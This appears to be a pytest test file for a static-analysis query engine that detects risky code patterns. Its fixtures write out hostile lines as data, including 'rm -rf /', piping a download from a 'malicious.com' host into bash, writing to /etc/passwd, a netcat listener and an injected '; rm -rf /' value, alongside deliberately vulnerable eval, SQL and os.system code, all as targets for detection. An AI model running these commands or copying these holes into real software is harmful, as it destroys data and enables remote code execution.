"""Tests for the query engine components."""

import pytest
from pathlib import Path
from typing import List
import tempfile
import os
import time
import pickle

from core.extractors.base_extractor import BaseExtractor
from core.query.query_parser import (
    DataflowNode,
    MetricsNode,
    PatternNode,
    QueryParser,
    QueryParseError,
    QueryType
)
from core.query.query_optimizer import QueryOptimizer, QueryOptimizationError
from core.query.query_executor import QueryExecutor, QueryResult

class MockExtractor(BaseExtractor):
    """Mock extractor for testing."""
    def extract(self, file_path: Path):
        return {}

    def supports_file(self, file_path: Path) -> bool:
        return file_path.suffix in ['.py', '.java']

    def get_supported_extensions(self) -> List[str]:
        return ['.py', '.java']

@pytest.fixture
def query_parser():
    """Create a QueryParser instance for testing."""
    return QueryParser()

@pytest.fixture
def query_optimizer():
    """Create a QueryOptimizer instance for testing."""
    return QueryOptimizer()

@pytest.fixture
def query_executor():
    """Create a QueryExecutor instance for testing."""
    return QueryExecutor([MockExtractor()])

@pytest.fixture
def sample_file(tmp_path):
    """Create a sample Python file for testing."""
    content = '''
def process_input(user_input):
    """Process user input."""
    # Potential security issue: direct use of input
    cmd = user_input
    os.system(cmd)  # Sink: command injection

def calculate_score(data):
    """Calculate a score."""
    if data > 0:
        if data < 10:
            if data % 2 == 0:
                return data * 2
    return 0

def sanitize_input(value):
    """Sanitize user input."""
    import shlex
    return shlex.quote(value)

def unsafe_eval(expr):
    """Unsafe eval usage."""
    return eval(expr)  # Security risk: eval

class DataProcessor:
    def __init__(self):
        self._data = {}

    def process(self, sql_query):
        """Process SQL query."""
        import sqlite3
        conn = sqlite3.connect('data.db')
        return conn.execute(sql_query)  # SQL injection risk
'''
    file_path = tmp_path / "sample.py"
    file_path.write_text(content)
    return file_path

# Parser Tests
def test_parse_pattern_query(query_parser):
    """Test parsing pattern matching queries."""
    # Basic pattern
    query = query_parser.parse('os.system')
    assert isinstance(query, PatternNode)
    assert query.pattern == 'os.system'
    assert query.case_sensitive is True

    # Pattern with language
    query = query_parser.parse('language:python os.system')
    assert query.pattern == 'os.system'
    assert query.language == 'python'

    # Pattern with case sensitivity
    query = query_parser.parse('case:false os.system')
    assert query.pattern == 'os.system'
    assert query.case_sensitive is False

    # Pattern with whole word matching
    query = query_parser.parse('word:true print')
    assert query.pattern == 'print'
    assert query.whole_word is True

def test_parse_dataflow_query(query_parser):
    """Test parsing dataflow analysis queries."""
    # Basic dataflow
    query = query_parser.parse('flow from user_input to os.system')
    assert isinstance(query, DataflowNode)
    assert query.source == 'user_input'
    assert query.sink == 'os.system'
    assert query.sanitizers is None

    # With sanitizers
    query = query_parser.parse('flow from user_input to os.system sanitize escape_shell, validate_input')
    assert query.sanitizers == ['escape_shell', 'validate_input']

    # With multiple sources
    query = query_parser.parse('flow from input, stdin to exec')
    assert isinstance(query, DataflowNode)
    assert query.source == 'input, stdin'
    assert query.sink == 'exec'

def test_parse_metrics_query(query_parser):
    """Test parsing metrics calculation queries."""
    # Basic metrics
    query = query_parser.parse('complexity 10')
    assert isinstance(query, MetricsNode)
    assert query.metric_type == 'complexity'
    assert query.threshold == 10.0

    # Without threshold
    query = query_parser.parse('loc')
    assert query.metric_type == 'loc'
    assert query.threshold is None

    # With decimal threshold
    query = query_parser.parse('complexity 5.5')
    assert query.threshold == 5.5

def test_parse_invalid_query(query_parser):
    """Test handling of invalid queries."""
    with pytest.raises(QueryParseError):
        query_parser.parse('')

    with pytest.raises(QueryParseError):
        query_parser.parse('flow from')  # Incomplete dataflow query

    with pytest.raises(QueryParseError):
        query_parser.parse('unknown_type test')  # Unknown query type

    with pytest.raises(QueryParseError):
        query_parser.parse('complexity invalid')  # Invalid threshold

# Optimizer Tests
def test_optimize_pattern_query(query_optimizer):
    """Test optimizing pattern matching queries."""
    # Test wildcard optimization
    query = PatternNode(pattern='.*test.*')
    optimized = query_optimizer.optimize(query)
    assert optimized.pattern == 'test'

    # Test character class optimization
    query = PatternNode(pattern='[0-9]+')
    optimized = query_optimizer.optimize(query)
    assert optimized.pattern == '\\d+'

    # Test multiple optimizations
    query = PatternNode(pattern='.*[a-zA-Z0-9_]+.*')
    optimized = query_optimizer.optimize(query)
    assert optimized.pattern == '\\w+'

def test_optimize_dataflow_query(query_optimizer):
    """Test optimizing dataflow analysis queries."""
    # Test sanitizer optimization
    query = DataflowNode(
        source='input',
        sink='output',
        sanitizers=['escape.shell', 'basic_check', 'complex.validation.check']
    )
    optimized = query_optimizer.optimize(query)
    assert optimized.sanitizers[0] == 'basic_check'  # Simplest
    assert optimized.sanitizers[-1] == 'complex.validation.check'  # Most complex

    # Test duplicate sanitizer removal
    query = DataflowNode(
        source='input',
        sink='output',
        sanitizers=['check', 'check', 'validate', 'validate']
    )
    optimized = query_optimizer.optimize(query)
    assert len(optimized.sanitizers) == 2
    assert set(optimized.sanitizers) == {'check', 'validate'}

def test_optimize_metrics_query(query_optimizer):
    """Test optimizing metrics calculation queries."""
    # Test type normalization
    query = MetricsNode(metric_type='COMPLEXITY', threshold=10.12345)
    optimized = query_optimizer.optimize(query)
    assert optimized.metric_type == 'complexity'
    assert optimized.threshold == 10.123  # Rounded to 3 decimal places

    # Test threshold rounding
    query = MetricsNode(metric_type='loc', threshold=5.6789)
    optimized = query_optimizer.optimize(query)
    assert optimized.threshold == 5.679

def test_optimizer_caching(query_optimizer):
    """Test query optimization caching."""
    # Test pattern cache
    query = PatternNode(pattern='test')
    query_optimizer.optimize(query)
    assert len(query_optimizer._pattern_cache) == 1
    query_optimizer.optimize(query)  # Should use cache
    assert len(query_optimizer._pattern_cache) == 1

    # Test dataflow cache
    query = DataflowNode(source='input', sink='output')
    query_optimizer.optimize(query)
    assert len(query_optimizer._dataflow_cache) == 1

    # Test cache clearing
    query_optimizer.clear_caches()
    assert len(query_optimizer._pattern_cache) == 0
    assert len(query_optimizer._dataflow_cache) == 0

# Executor Tests
def test_execute_pattern_query(query_executor, sample_file):
    """Test executing pattern matching queries."""
    # Test basic pattern
    query = PatternNode(pattern='os\\.system')
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1
    assert results[0].snippet.strip() == 'os.system(cmd)  # Sink: command injection'

    # Test case insensitive
    query = PatternNode(pattern='OS\\.SYSTEM', case_sensitive=False)
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1

    # Test whole word
    query = PatternNode(pattern='eval', whole_word=True)
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1
    assert 'eval(expr)' in results[0].snippet

def test_execute_dataflow_query(query_executor, sample_file):
    """Test executing dataflow analysis queries."""
    # Test basic dataflow
    query = DataflowNode(source='user_input', sink='os.system')
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1
    assert 'user_input' in results[0].metadata['source']
    assert 'os.system' in results[0].metadata['sink']

    # Test with sanitizer
    query = DataflowNode(
        source='user_input',
        sink='os.system',
        sanitizers=['sanitize_input']
    )
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 0  # Should be sanitized

def test_execute_metrics_query(query_executor, sample_file):
    """Test executing metrics calculation queries."""
    # Test complexity metric
    query = MetricsNode(metric_type='complexity')
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1
    assert results[0].metadata['value'] > 1

    # Test LOC metric
    query = MetricsNode(metric_type='loc')
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1
    assert results[0].metadata['value'] > 0

    # Test with threshold
    query = MetricsNode(metric_type='complexity', threshold=1)
    results = list(query_executor.execute(query, [sample_file]))
    assert len(results) == 1  # Should find complex functions

def test_execute_with_language_filter(query_executor, tmp_path):
    """Test query execution with language filtering."""
    # Create test files
    py_file = tmp_path / "test.py"
    py_file.write_text("test = 123")

    txt_file = tmp_path / "test.txt"
    txt_file.write_text("test = 123")

    java_file = tmp_path / "test.java"
    java_file.write_text("int test = 123;")

    # Test Python filter
    query = PatternNode(pattern='test', language='python')
    results = list(query_executor.execute(query, [py_file, txt_file, java_file]))
    assert len(results) == 1
    assert results[0].file_path == py_file

    # Test Java filter
    query = PatternNode(pattern='test', language='java')
    results = list(query_executor.execute(query, [py_file, txt_file, java_file]))
    assert len(results) == 1
    assert results[0].file_path == java_file

def test_execute_with_invalid_files(query_executor, tmp_path):
    """Test query execution with invalid files."""
    # Test non-existent file
    bad_file = tmp_path / "nonexistent.py"
    query = PatternNode(pattern='test')
    results = list(query_executor.execute(query, [bad_file]))
    assert len(results) == 0

    # Test directory
    dir_path = tmp_path / "test_dir"
    dir_path.mkdir()
    results = list(query_executor.execute(query, [dir_path]))
    assert len(results) == 0

    # Test empty file
    empty_file = tmp_path / "empty.py"
    empty_file.touch()
    results = list(query_executor.execute(query, [empty_file]))
    assert len(results) == 0

def test_parallel_execution(query_executor, tmp_path):
    """Test parallel execution of queries."""
    # Create test files
    files = []
    for i in range(5):
        file_path = tmp_path / f"test{i}.py"
        file_path.write_text(f"value_{i} = {i}")
        files.append(file_path)

    # Test pattern query
    query = PatternNode(pattern='value_[0-9]')
    results = list(query_executor.execute(query, files))
    assert len(results) == 5

    # Test with different thread counts
    executor = QueryExecutor([MockExtractor()], config={'max_workers': 2})
    results = list(executor.execute(query, files))
    assert len(results) == 5

def test_timeout_handling(query_executor, tmp_path):
    """Test handling of execution timeouts."""
    # Create a large file
    large_file = tmp_path / "large.py"
    with open(large_file, 'w') as f:
        for i in range(10000):
            f.write(f"value_{i} = {i}\n")

    # Set a very short timeout
    executor = QueryExecutor([MockExtractor()], config={'timeout_seconds': 0.001})
    query = PatternNode(pattern='value_[0-9]')

    with pytest.raises(TimeoutError):
        list(executor.execute(query, [large_file]))

# Integration Tests with Anthropic Computer Use Demo
def test_analyze_bash_command(query_executor, tmp_path):
    """Test analysis of bash commands for pre-execution security checks."""
    # Create a file with potentially dangerous bash commands
    commands_file = tmp_path / "commands.sh"
    commands_file.write_text('''
    rm -rf /  # Dangerous command
    wget http://malicious.com/script.sh -O- | bash  # Unsafe download and execution
    curl http://example.com/script | sudo bash  # Privileged execution
    echo "malicious" > /etc/passwd  # System file modification
    ''')

    # Test pattern matching for dangerous commands
    query = PatternNode(pattern='rm -rf /')
    results = list(query_executor.execute(query, [commands_file]))
    assert len(results) == 1
    assert 'rm -rf /' in results[0].snippet

    # Test for unsafe downloads
    query = PatternNode(pattern='wget.*\\|.*bash|curl.*\\|.*bash')
    results = list(query_executor.execute(query, [commands_file]))
    assert len(results) == 2

    # Test for privileged operations
    query = PatternNode(pattern='sudo')
    results = list(query_executor.execute(query, [commands_file]))
    assert len(results) == 1

def test_analyze_file_operations(query_executor, tmp_path):
    """Test analysis of file operations for security monitoring."""
    # Create a file with file operations
    operations_file = tmp_path / "file_ops.py"
    operations_file.write_text('''
    import os

    def unsafe_operations():
        # Sensitive file access
        with open('/etc/passwd', 'r') as f:
            data = f.read()

        # Directory traversal
        path = '../../../etc/shadow'
        os.path.join(path, 'file')

        # File permission modification
        os.chmod('/etc/ssh/sshd_config', 0o777)

        # Arbitrary file write
        with open('/tmp/malicious', 'w') as f:
            f.write('bad data')
    ''')

    # Test for sensitive file access
    query = PatternNode(pattern='/etc/passwd|/etc/shadow')
    results = list(query_executor.execute(query, [operations_file]))
    assert len(results) == 2

    # Test for directory traversal
    query = PatternNode(pattern='\\.\\./\\.\\./\\.\\.')
    results = list(query_executor.execute(query, [operations_file]))
    assert len(results) == 1

    # Test for permission modifications
    query = PatternNode(pattern='os\\.chmod')
    results = list(query_executor.execute(query, [operations_file]))
    assert len(results) == 1

def test_analyze_network_operations(query_executor, tmp_path):
    """Test analysis of network operations for runtime monitoring."""
    # Create a file with network operations
    network_file = tmp_path / "network_ops.py"
    network_file.write_text('''
    import socket
    import requests

    def network_operations():
        # Raw socket creation
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(('0.0.0.0', 1337))
        sock.listen(5)

        # HTTP requests
        response = requests.get('http://example.com')
        data = requests.post('https://api.example.com/data',
                           json={'key': 'value'},
                           verify=False)  # Unsafe SSL

        # DNS resolution
        socket.gethostbyname('example.com')
    ''')

    # Test for unsafe network bindings
    query = PatternNode(pattern='0\\.0\\.0\\.0')
    results = list(query_executor.execute(query, [network_file]))
    assert len(results) == 1

    # Test for unsafe SSL usage
    query = PatternNode(pattern='verify=False')
    results = list(query_executor.execute(query, [network_file]))
    assert len(results) == 1

def test_analyze_process_execution(query_executor, tmp_path):
    """Test analysis of process execution for runtime monitoring."""
    # Create a file with process execution
    process_file = tmp_path / "process_ops.py"
    process_file.write_text('''
    import subprocess
    import os

    def process_operations():
        # Shell execution
        subprocess.call('ls -la', shell=True)
        os.system('cat /etc/passwd')

        # Command injection risk
        user_input = 'user_data; rm -rf /'
        os.system(f'echo {user_input}')

        # Process creation
        subprocess.Popen(['nc', '-l', '-p', '4444'])
    ''')

    # Test for shell=True usage
    query = PatternNode(pattern='shell=True')
    results = list(query_executor.execute(query, [process_file]))
    assert len(results) == 1

    # Test for command injection risks
    query = DataflowNode(source='user_input', sink='os.system')
    results = list(query_executor.execute(query, [process_file]))
    assert len(results) == 1

def test_analyze_resource_usage(query_executor, tmp_path):
    """Test analysis of resource usage patterns."""
    # Create a file with resource usage
    resource_file = tmp_path / "resource_ops.py"
    resource_file.write_text('''
    import multiprocessing
    import os
    import psutil

    def resource_operations():
        # CPU-intensive operations
        for _ in range(multiprocessing.cpu_count() * 2):
            process = multiprocessing.Process(target=cpu_intensive)
            process.start()

        # Memory usage
        large_list = [0] * (10 ** 8)  # Large memory allocation

        # File descriptors
        files = [open(f'file_{i}.txt', 'w') for i in range(1000)]

        # Disk usage
        with open('large_file.txt', 'w') as f:
            f.write('0' * (1024 ** 3))  # 1GB file
    ''')

    # Test for excessive process creation
    query = PatternNode(pattern='multiprocessing\\.Process')
    results = list(query_executor.execute(query, [resource_file]))
    assert len(results) == 1

    # Test for large memory allocations
    query = PatternNode(pattern='10 \\*\\* 8')
    results = list(query_executor.execute(query, [resource_file]))
    assert len(results) == 1

    # Test for file descriptor usage
    query = PatternNode(pattern='range\\(1000\\)')
    results = list(query_executor.execute(query, [resource_file]))
    assert len(results) == 1

def test_analyze_agent_logs(query_executor, tmp_path):
    """Test analysis of agent execution logs."""
    # Create a sample log file
    log_file = tmp_path / "agent.log"
    log_file.write_text('''
    2024-01-20 10:00:01 INFO Agent started execution
    2024-01-20 10:00:02 DEBUG Command executed: ls -la
    2024-01-20 10:00:03 WARNING Failed to access /etc/passwd
    2024-01-20 10:00:04 ERROR Exception: Permission denied
    2024-01-20 10:00:05 INFO Network connection to example.com
    2024-01-20 10:00:06 WARNING High CPU usage detected
    2024-01-20 10:00:07 ERROR Failed to execute rm -rf /
    ''')

    # Test for error patterns
    query = PatternNode(pattern='ERROR')
    results = list(query_executor.execute(query, [log_file]))
    assert len(results) == 2

    # Test for security-related events
    query = PatternNode(pattern='/etc/passwd|rm -rf /')
    results = list(query_executor.execute(query, [log_file]))
    assert len(results) == 2

    # Test for resource warnings
    query = PatternNode(pattern='High CPU usage')
    results = list(query_executor.execute(query, [log_file]))
    assert len(results) == 1

# YAML Syntax Analysis Tests
def test_analyze_yaml_syntax(query_executor, tmp_path):
    """Test analysis of YAML syntax errors."""
    # Create a file with common YAML syntax issues
    yaml_file = tmp_path / "config.yaml"
    yaml_file.write_text('''
    # Missing colon after key
    key1 value1

    # Invalid indentation with backticks
    `key2: value2

    # Mapping values in wrong context
    key3: first: second

    # Missing document start marker
    {key4: value4}

    # Invalid block sequence entry
    key5:
    -invalid

    # Invalid node content
    key6: |
      - this is a list
      ` invalid character
    ''')

    # Test for missing colons
    query = PatternNode(pattern='\\w+\\s+\\w+\\s*$')
    results = list(query_executor.execute(query, [yaml_file]))
    assert len(results) == 1
    assert 'key1 value1' in results[0].snippet

    # Test for backtick indentation
    query = PatternNode(pattern='`.*:')
    results = list(query_executor.execute(query, [yaml_file]))
    assert len(results) == 1
    assert '`key2: value2' in results[0].snippet

    # Test for invalid mapping values
    query = PatternNode(pattern='\\w+:\\s+\\w+:\\s+\\w+')
    results = list(query_executor.execute(query, [yaml_file]))
    assert len(results) == 1
    assert 'key3: first: second' in results[0].snippet

def test_analyze_yaml_helm_templates(query_executor, tmp_path):
    """Test analysis of Helm template YAML files."""
    # Create a sample Helm template file
    helm_file = tmp_path / "deployment.yaml"
    helm_file.write_text('''
    apiVersion: apps/v1
    kind: Deployment
    metadata:
      name: {{ .Release.Name }}
    spec:
      replicas {{ .Values.replicaCount }}  # Missing colon
      template:
        spec:
          containers:
          - name: {{ .Chart.Name }}
            image: {{ .Values.image.repository }}:{{ .Values.image.tag }}
            ports:
            - containerPort: 8080
            env:
            name: API_KEY  # Invalid indentation
              value: {{ .Values.apiKey }}
    ''')

    # Test for missing colons in Helm templates
    query = PatternNode(pattern='\\w+\\s+{{.*}}\\s*$')
    results = list(query_executor.execute(query, [helm_file]))
    assert len(results) == 1
    assert 'replicas {{ .Values.replicaCount }}' in results[0].snippet

    # Test for indentation errors in container specs
    query = PatternNode(pattern='^\\s*name:\\s+\\w+\\s*$')
    results = list(query_executor.execute(query, [helm_file]))
    assert len(results) == 1
    assert 'name: API_KEY' in results[0].snippet

def test_analyze_yaml_cognitive_framework(query_executor, tmp_path):
    """Test analysis of cognitive framework YAML configurations."""
    # Create a sample cognitive framework config file
    framework_file = tmp_path / "cognitive-framework.yaml"
    framework_file.write_text('''
    meta_framework:
      core_principles
        - fluid_emergence:  # Missing colon after core_principles
            description: "Let ideas flow like rivers"
            implementation: Dynamic tag generation

    cognitive_process:
      processing_layers:
        understanding_layer
          stage: 1  # Invalid indentation
          components: ["situation_analysis", "context_mapping"]
          meta_tags:
            understanding_depth: integer  # Invalid type definition
            range: [1, 10]
            description This is invalid  # Missing colon

    implementation_framework:
      data_sources: []
      inference_mechanisms []  # Missing colon
      learning_algorithms: []
      external_knowledge []  # Missing colon
    ''')

    # Test for missing colons in hierarchical structures
    query = PatternNode(pattern='\\w+\\s*$')
    results = list(query_executor.execute(query, [framework_file]))
    assert len(results) >= 2

    # Test for invalid indentation in nested structures
    query = PatternNode(pattern='^\\s*\\w+:\\s+\\w+\\s*$')
    results = list(query_executor.execute(query, [framework_file]))
    assert len(results) >= 1

    # Test for missing colons in list definitions
    query = PatternNode(pattern='\\w+\\s+\\[\\]\\s*$')
    results = list(query_executor.execute(query, [framework_file]))
    assert len(results) >= 2

def test_analyze_yaml_meta_cognitive(query_executor, tmp_path):
    """Test analysis of meta-cognitive YAML configurations."""
    # Create a sample meta-cognitive config file
    meta_file = tmp_path / "meta-cognitive.yaml"
    meta_file.write_text('''
    meta_cognitive_analysis:
      reflection_layers:
        - layer_1: "First order thinking"
          validation: {type: "recursive"}  # Invalid inline mapping
        - layer_2: Second order thinking  # Missing quotes
          validation: type: "recursive"  # Invalid mapping format

    structural_constraints:
      `indentation: "must use spaces"  # Invalid backtick
      hierarchy:
        - level_1:
            rules: |
              This is a multiline
              ` string with invalid character

    cognitive_markers:
      - marker_1: {type: "flux", scope: "global" validation: "continuous"}  # Missing comma
      - marker_2: {
        type: "bridge"
        scope: "local"  # Missing comma
        validation: "periodic"
      }
    ''')

    # Test for invalid inline mappings
    query = PatternNode(pattern='{[^}]+:[^}]+:[^}]+}')
    results = list(query_executor.execute(query, [meta_file]))
    assert len(results) >= 1

    # Test for missing quotes in string values
    query = PatternNode(pattern=':\\s+\\w+\\s+\\w+\\s*$')
    results = list(query_executor.execute(query, [meta_file]))
    assert len(results) >= 1

    # Test for backtick usage
    query = PatternNode(pattern='`[^\\n]+')
    results = list(query_executor.execute(query, [meta_file]))
    assert len(results) >= 2

    # Test for missing commas in flow mappings
    query = PatternNode(pattern='{[^}]+\\s+\\w+:')
    results = list(query_executor.execute(query, [meta_file]))
    assert len(results) >= 2

# Command Execution Analysis Tests
def test_analyze_build_commands(query_executor, tmp_path):
    """Test analysis of build and package management commands."""
    # Create a file with build commands
    build_file = tmp_path / "build_commands.sh"
    build_file.write_text('''
    # Package management
    python -m pip install --upgrade pip
    pip install -r requirements.txt
    pip install pytest pytest-asyncio pytest-cov ruff mypy
    npm install
    npm run build

    # Build tools
    magic self-update --version 0.2.3
    magic run tests
    magic run examples
    ./stdlib/scripts/install-build-tools-linux.sh
    ./stdlib/scripts/install-build-tools-macos.sh
    ''')

    # Test for pip install patterns
    query = PatternNode(pattern='pip install.*-r')
    results = list(query_executor.execute(query, [build_file]))
    assert len(results) == 1
    assert 'requirements.txt' in results[0].snippet

    # Test for npm commands
    query = PatternNode(pattern='npm (install|run)')
    results = list(query_executor.execute(query, [build_file]))
    assert len(results) == 2

    # Test for build tool execution
    query = PatternNode(pattern='magic run')
    results = list(query_executor.execute(query, [build_file]))
    assert len(results) == 2

def test_analyze_docker_commands(query_executor, tmp_path):
    """Test analysis of Docker-related commands."""
    # Create a file with Docker commands
    docker_file = tmp_path / "docker_commands.sh"
    docker_file.write_text('''
    # Image creation and tagging
    docker buildx imagetools create -t ${REGISTRY}:computer-use-demo-${SHORT_SHA} ${REGISTRY}:computer-use-demo-${SHORT_SHA}-amd64 ${REGISTRY}:computer-use-demo-${SHORT_SHA}-arm64
    docker buildx imagetools create -t ${REGISTRY}:computer-use-demo-latest ${REGISTRY}:computer-use-demo-latest-amd64 ${REGISTRY}:computer-use-demo-latest-arm64

    # Container operations
    docker run -d -p 8051:8051 ${{ env.TAG }}
    docker ps --filter "ancestor=${{ env.TAG }}" --format "{{.ID}}"
    docker exec $docker_id curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8501
    docker exec $docker_id nc localhost 5900 -z
    ''')

    # Test for docker build commands
    query = PatternNode(pattern='docker buildx')
    results = list(query_executor.execute(query, [docker_file]))
    assert len(results) == 2

    # Test for docker run commands
    query = PatternNode(pattern='docker run.*-p')
    results = list(query_executor.execute(query, [docker_file]))
    assert len(results) == 1

    # Test for docker exec commands
    query = PatternNode(pattern='docker exec.*curl')
    results = list(query_executor.execute(query, [docker_file]))
    assert len(results) == 1

def test_analyze_ci_commands(query_executor, tmp_path):
    """Test analysis of CI/CD workflow commands."""
    # Create a file with CI commands
    ci_file = tmp_path / "ci_commands.sh"
    ci_file.write_text('''
    # Git operations
    git rev-parse --short ${{ github.sha }}
    echo "SHORT_SHA=$(git rev-parse --short ${{ github.sha }})"

    # Environment setup
    timeout=60
    start_time=$(date +%s)
    current_time=$(date +%s)
    elapsed=$((current_time - start_time))

    # Health checks
    response=$(docker exec $docker_id curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8501 || echo "000")
    if [ "$response" = "200" ]; then
        echo "Container responded with 200 OK"
    else
        echo "Timeout reached. Container did not respond within $timeout seconds."
        exit 1
    fi

    # Testing
    pytest computer-use-demo/tests/ \\
        --cov=computer-use-demo/computer_use_demo/ \\
        --cov-report=xml \\
        --cov-report=term-missing \\
        --asyncio-mode=auto

    # Linting
    ruff check computer-use-demo/computer_use_demo/
    mypy --ignore-missing-imports computer-use-demo/computer_use_demo/
    ''')

    # Test for git commands
    query = PatternNode(pattern='git rev-parse.*github\\.sha')
    results = list(query_executor.execute(query, [ci_file]))
    assert len(results) == 2

    # Test for timing operations
    query = PatternNode(pattern='date \\+%s')
    results = list(query_executor.execute(query, [ci_file]))
    assert len(results) == 2

    # Test for test commands
    query = PatternNode(pattern='pytest.*--cov')
    results = list(query_executor.execute(query, [ci_file]))
    assert len(results) == 1

    # Test for linting commands
    query = PatternNode(pattern='(ruff check|mypy.*imports)')
    results = list(query_executor.execute(query, [ci_file]))
    assert len(results) == 2

def test_analyze_command_injection_risks(query_executor, tmp_path):
    """Test analysis of potential command injection risks in CI/CD scripts."""
    # Create a file with potentially risky commands
    risk_file = tmp_path / "risky_commands.sh"
    risk_file.write_text('''
    # Direct use of environment variables
    docker run $IMAGE_TAG  # Missing quotes

    # Unescaped variables in commands
    ssh $REMOTE_HOST "rm -rf $TARGET_DIR"  # Unescaped variables

    # Command substitution without validation
    RESULT=$(curl $API_ENDPOINT)  # Unvalidated URL
    eval "echo $RESULT"  # Dangerous eval

    # Direct execution of downloaded content
    curl http://example.com/script.sh | bash
    wget -O- http://example.com/script | sh

    # Unvalidated user input in commands
    TAG_NAME="${{ github.event.inputs.tag }}"
    docker push ${REGISTRY}:${TAG_NAME}  # Unvalidated tag
    ''')

    # Test for unquoted variables
    query = PatternNode(pattern='\\$[A-Z_]+\\s')
    results = list(query_executor.execute(query, [risk_file]))
    assert len(results) >= 1

    # Test for dangerous command substitution
    query = PatternNode(pattern='eval.*\\$')
    results = list(query_executor.execute(query, [risk_file]))
    assert len(results) == 1

    # Test for piped execution
    query = PatternNode(pattern='(curl|wget).*\\|.*(bash|sh)')
    results = list(query_executor.execute(query, [risk_file]))
    assert len(results) == 2

    # Test for unvalidated inputs
    query = PatternNode(pattern='\\$\\{\{.*inputs.*\\}\\}')
    results = list(query_executor.execute(query, [risk_file]))
    assert len(results) == 1

# LLM Integration Tests
def test_analyze_llm_generated_code(query_executor, tmp_path):
    """Test analysis of code generated by an LLM."""
    # Create a file with LLM-generated code
    llm_file = tmp_path / "llm_generated.py"
    llm_file.write_text('''
    # Code generated by Claude - 2024-01-20
    def process_user_data(user_input):
        """Process user provided data."""
        # Direct use of input in SQL query
        query = f"SELECT * FROM users WHERE name = '{user_input}'"

        # Unsafe file operations
        with open(user_input, 'r') as f:
            data = f.read()

        # Dangerous eval usage
        result = eval(f"process_{user_input}()")

        return data

    def handle_file_upload(filename):
        """Handle file upload."""
        # Path traversal vulnerability
        path = f"uploads/{filename}"

        # Command injection risk
        os.system(f"process_upload {filename}")

        return "File processed"
    ''')

    # Test for SQL injection vulnerabilities
    query = PatternNode(pattern="SELECT.*{.*}.*FROM")
    results = list(query_executor.execute(query, [llm_file]))
    assert len(results) == 1

    # Test for unsafe file operations
    query = DataflowNode(source='user_input', sink='open')
    results = list(query_executor.execute(query, [llm_file]))
    assert len(results) == 1

    # Test for eval usage
    query = PatternNode(pattern='eval\\(.*\\)')
    results = list(query_executor.execute(query, [llm_file]))
    assert len(results) == 1

def test_analyze_llm_fixes(query_executor, tmp_path):
    """Test analysis of LLM-generated fixes for security issues."""
    # Create original file with issues
    original_file = tmp_path / "original.py"
    original_file.write_text('''
    def unsafe_function(user_input):
        os.system(user_input)  # Command injection
    ''')

    # Create LLM-fixed version
    fixed_file = tmp_path / "fixed.py"
    fixed_file.write_text('''
    import shlex
    import subprocess

    def safe_function(user_input):
        """Execute command safely with input validation."""
        # Sanitize input
        safe_input = shlex.quote(user_input)
        # Use subprocess with shell=False
        subprocess.run(['echo', safe_input], shell=False)
    ''')

    # Test original for command injection
    query = DataflowNode(source='user_input', sink='os.system')
    results = list(query_executor.execute(query, [original_file]))
    assert len(results) == 1

    # Test fixed version
    results = list(query_executor.execute(query, [fixed_file]))
    assert len(results) == 0

def test_analyze_llm_refactoring(query_executor, tmp_path):
    """Test analysis of LLM-driven code refactoring."""
    # Create original complex file
    complex_file = tmp_path / "complex.py"
    complex_file.write_text('''
    def complex_function(data):
        if data:
            if isinstance(data, dict):
                if 'key' in data:
                    if data['key']:
                        if data['key'].startswith('test'):
                            return process(data['key'])
        return None

    def process(key):
        # Complex processing
        result = None
        try:
            if key:
                if validate(key):
                    if transform(key):
                        result = calculate(key)
        except Exception as e:
            print(f"Error: {e}")
        return result
    ''')

    # Create LLM-refactored version
    refactored_file = tmp_path / "refactored.py"
    refactored_file.write_text('''
    from typing import Optional, Dict

    def process_data(data: Optional[Dict]) -> Optional[str]:
        """Process data with proper validation and error handling."""
        if not data or not isinstance(data, dict):
            return None

        key = data.get('key')
        if not key or not key.startswith('test'):
            return None

        return process_key(key)

    def process_key(key: str) -> Optional[str]:
        """Process a validated key."""
        try:
            if not validate(key):
                return None

            transformed = transform(key)
            if not transformed:
                return None

            return calculate(key)
        except Exception as e:
            logger.error(f"Error processing key: {e}")
            return None
    ''')

    # Test complexity reduction
    query = MetricsNode(metric_type='complexity', threshold=3)
    complex_results = list(query_executor.execute(query, [complex_file]))
    refactored_results = list(query_executor.execute(query, [refactored_file]))
    assert len(complex_results) > len(refactored_results)

def test_analyze_llm_documentation(query_executor, tmp_path):
    """Test analysis of LLM-generated documentation and type hints."""
    # Create file with poor documentation
    poor_doc_file = tmp_path / "poor_doc.py"
    poor_doc_file.write_text('''
    def process(x):
        # Do stuff
        y = x + 1
        return y

    def transform(data):
        result = []
        for i in data:
            result.append(i * 2)
        return result

    class Handler:
        def __init__(self):
            self.items = {}

        def add(self, key, value):
            self.items[key] = value

        def get(self, key):
            return self.items.get(key)
    ''')

    # Create LLM-improved version
    good_doc_file = tmp_path / "good_doc.py"
    good_doc_file.write_text('''
    from typing import Dict, List, TypeVar, Optional

    T = TypeVar('T')

    def process(x: int) -> int:
        """Increment the input value by 1.

        Args:
            x: The integer value to increment.

        Returns:
            The incremented value.
        """
        y = x + 1
        return y

    def transform(data: List[T]) -> List[T]:
        """Double each element in the input list.

        Args:
            data: A list of numeric values.

        Returns:
            A new list with each element doubled.
        """
        return [i * 2 for i in data]

    class Handler:
        """A key-value storage handler with type safety."""

        def __init__(self):
            """Initialize an empty handler."""
            self.items: Dict[str, T] = {}

        def add(self, key: str, value: T) -> None:
            """Add a key-value pair to the handler.

            Args:
                key: The unique identifier for the value.
                value: The value to store.
            """
            self.items[key] = value

        def get(self, key: str) -> Optional[T]:
            """Retrieve a value by its key.

            Args:
                key: The key to look up.

            Returns:
                The stored value or None if the key doesn't exist.
            """
            return self.items.get(key)
    ''')

    # Test for docstring presence
    query = PatternNode(pattern='""".*"""', case_sensitive=False)
    poor_results = list(query_executor.execute(query, [poor_doc_file]))
    good_results = list(query_executor.execute(query, [good_doc_file]))
    assert len(good_results) > len(poor_results)

    # Test for type hints
    query = PatternNode(pattern='def.*->.*:')
